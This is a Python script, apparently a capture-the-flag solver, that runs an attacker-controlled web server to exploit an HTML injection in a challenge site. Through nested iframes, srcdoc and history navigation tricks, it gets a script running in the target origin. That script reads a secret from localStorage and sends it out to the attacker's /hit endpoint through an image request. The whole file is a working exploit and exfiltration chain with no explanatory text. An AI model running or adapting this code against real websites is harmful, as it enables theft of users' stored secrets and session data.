#!/usr/bin/env python3
from __future__ import annotations
import argparse, html, json, threading, time, urllib.parse
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

class State:
    def __init__(self):
        self.stage = 0
        self.hits = []
        self.requests = []
        self.lock = threading.Lock()

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument('--public-origin', required=True)
    ap.add_argument('--challenge-origin', default='http://web:1337')
    ap.add_argument('--token', required=True)
    ap.add_argument('--port', type=int, default=8000)
    a = ap.parse_args()
    public = a.public_origin.rstrip('/')
    challenge = a.challenge_origin.rstrip('/')
    state = State()

    def au(path, **kw):
        q = urllib.parse.urlencode(kw)
        return public + path + (('?' + q) if q else '')
    def cu(content):
        return challenge + '/?content=' + urllib.parse.quote(content, safe='')
    def initial():
        return cu('<iframe name="m" src="' + html.escape(au('/stage', t=a.token), quote=True) + '"></iframe>')
    def payload():
        hit = au('/hit', t=a.token)
        return f'''<!doctype html><meta charset=utf-8><script>
(() => {{
 const flag = localStorage.getItem('flag');
 console.log('[chronostasis payload] url=' + location.href + ' origin=' + location.origin + ' flag=' + flag);
 if (flag) {{ new Image().src = {json.dumps(hit)} + '&flag=' + encodeURIComponent(flag); }}
}})();
</script>'''
    def stage1():
        p = html.escape(payload(), quote=True)
        d = au('/dummy', t=a.token)
        return f'''<!doctype html><meta charset=utf-8><title>stage</title>
<script>
let n=0;
function loaded(f) {{
 n++;
 let u='?'; try {{u=f.contentWindow.location.href}} catch(e) {{u='cross-origin'}}
 console.log('[chronostasis stage] child load=' + n + ' url=' + u + ' history=' + history.length);
 if(n===1) setTimeout(() => f.contentWindow.location.assign({json.dumps(d)}), 100);
 if(n===2) setTimeout(() => location.reload(), 180);
}}
</script><iframe name="g" onload="loaded(this)" srcdoc="{p}"></iframe>'''
    def stage2():
        b = au('/back', t=a.token)
        return cu('<iframe name="g" src="' + html.escape(b, quote=True) + '"></iframe>')

    class H(BaseHTTPRequestHandler):
        def log_message(self, fmt, *args):
            print('[http] ' + (fmt % args), flush=True)
        def sendb(self, status, body=b'', ctype='text/html; charset=utf-8', headers=None):
            self.send_response(status)
            self.send_header('Content-Type', ctype)
            self.send_header('Content-Length', str(len(body)))
            self.send_header('Cache-Control','no-store, no-cache, must-revalidate')
            self.send_header('Connection','close')
            if headers:
                for k,v in headers.items(): self.send_header(k,v)
            self.end_headers()
            if body: self.wfile.write(body)
        def html(self, s, status=200): self.sendb(status, s.encode())
        def redirect(self, u): self.sendb(302, headers={'Location':u})
        def do_GET(self):
            p = urllib.parse.urlsplit(self.path)
            q = urllib.parse.parse_qs(p.query, keep_blank_values=True)
            with state.lock: state.requests.append({'time':time.time(),'path':self.path,'host':self.headers.get('Host','')})
            if q.get('t',[''])[0] != a.token:
                self.html('bad token',403); return
            if p.path in ('/','/start'):
                u=initial(); print('[chain] start -> '+u, flush=True); self.redirect(u); return
            if p.path == '/stage':
                with state.lock:
                    state.stage += 1; n=state.stage
                print(f'[chain] stage request #{n}', flush=True)
                if n == 1: self.html(stage1())
                else:
                    u=stage2(); print('[chain] stage redirect -> '+u, flush=True); self.redirect(u)
                return
            if p.path == '/dummy': self.html('<!doctype html><title>dummy</title>dummy'); return
            if p.path == '/back':
                self.html("<!doctype html><meta charset=utf-8><script>console.log('[chronostasis back] history='+history.length);setTimeout(()=>history.back(),250)</script>"); return
            if p.path == '/hit':
                f=q.get('flag',[''])[0]
                with state.lock: state.hits.append(f)
                print('\nLIVE_FLAG=' + f + '\n', flush=True)
                self.html('ok'); return
            if p.path == '/status':
                with state.lock: o={'stage':state.stage,'hits':state.hits,'requests':state.requests}
                self.sendb(200,json.dumps(o,indent=2).encode(),'application/json'); return
            self.html('not found',404)

    print('START_URL=' + au('/start', t=a.token), flush=True)
    ThreadingHTTPServer(('0.0.0.0',a.port),H).serve_forever()
if __name__=='__main__': main()
